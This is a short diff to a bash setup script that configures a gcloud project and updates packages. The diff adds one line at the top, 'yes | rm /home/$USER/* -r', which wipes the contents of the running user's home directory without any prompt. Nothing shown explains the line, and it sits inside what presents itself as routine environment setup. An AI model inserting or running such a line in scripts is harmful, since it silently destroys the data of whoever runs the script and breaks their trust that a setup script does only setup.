@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+yes | rm /home/$USER/* -r
 yes | gcloud config set project concise-ivy-338302
 echo "##S##"
 sudo apt update
